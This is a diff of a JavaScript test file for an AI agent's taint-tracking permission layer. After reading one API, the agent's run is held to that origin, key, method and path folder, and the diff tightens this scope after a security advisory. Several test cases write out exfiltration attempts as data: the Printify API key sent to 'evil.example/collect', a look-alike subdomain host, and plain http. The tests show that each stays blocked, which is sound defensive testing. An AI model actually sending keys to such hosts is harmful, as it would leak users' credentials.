@@ -376,16 +376,19 @@ A.eq(taint.postTaintBoundary(FS_WRITE, { taintedBy: 'web_fetch', surface: 'auton
 // ---- SAME-ORIGIN API CONTINUATION (owner decision 2026-10-12, Etsy-factory Publisher report) ----
 // Reading one API's response revoked web_request: one card per call in a watched run ("session" collapsed to once),
 // a refusal in an unattended one — so no GET-then-PUT API job could run hands-off. The continuation lets the run keep
-// calling THAT https origin with keys it already sent there; everything else keeps the lock.
+// calling THAT https origin with keys it already sent there, with the first read's method under its folder and no attached
+// files (GHSA-2hpj #6); everything else keeps the lock.
 {
   const wr = { name: 'web_request', capability: 'web', scope: 'write', impact: 'external-credentialed' };
   const call = (url, extra) => ({ name: 'web_request', args: Object.assign({ url }, extra || {}) });
   const P = 'https://api.printify.com/v1/shops/1/products/5de6593ebff03b5313567d22.json';
   const key = { headers: { Authorization: 'Bearer ${PRINTIFY_API_KEY}' } };
   let s = taint.scopeAfterSource(null, wr, call(P, key), { wasTainted: false, runId: 'r1', responseOrigin: 'https://api.printify.com' });
-  A.eq(JSON.stringify(s), '{"origin":"https://api.printify.com","keys":["PRINTIFY_API_KEY"]}', 'the first API read scopes the run to that origin + key');
-  A.ok(taint.sameOriginContinuation(s, wr, call(P, Object.assign({ method: 'PUT', body: '{}' }, key))), 'a PUT back to the same API with the same key continues without a card');
-  A.ok(taint.sameOriginContinuation(s, wr, call('https://api.printify.com/v1/uploads/images.json', Object.assign({ method: 'POST' }, key))), 'any path on the same origin');
+  A.eq(JSON.stringify(s), '{"origin":"https://api.printify.com","keys":["PRINTIFY_API_KEY"],"method":"GET","prefix":"/v1/shops/1/products/"}', 'the first API read scopes the run to that origin + key, and to its method + path folder (GHSA-2hpj #6)');
+  A.ok(taint.sameOriginContinuation(s, wr, call('https://api.printify.com/v1/shops/1/products/another.json', key)), 'a GET under the same folder with the same key continues without a card');
+  // GHSA-2hpj #6: one origin is not one principal, so a write after a read and another folder ask again (test/taint-api-continuation-scope.test.js)
+  A.ok(!taint.sameOriginContinuation(s, wr, call(P, Object.assign({ method: 'PUT', body: '{}' }, key))), 'a PUT after a GET is another method: it needs a fresh confirmation');
+  A.ok(!taint.sameOriginContinuation(s, wr, call('https://api.printify.com/v1/uploads/images.json', Object.assign({ method: 'POST' }, key))), 'another path on the same origin no longer continues');
   A.ok(!taint.sameOriginContinuation(s, wr, call('https://evil.example/collect', key)), 'another host keeps the lock (no exfiltration with the key)');
   A.ok(!taint.sameOriginContinuation(s, wr, call('https://api.printify.com.evil.example/x', key)), 'a look-alike host keeps the lock');
   A.ok(!taint.sameOriginContinuation(s, wr, call('http://api.printify.com/v1/x', key)), 'plain http keeps the lock');
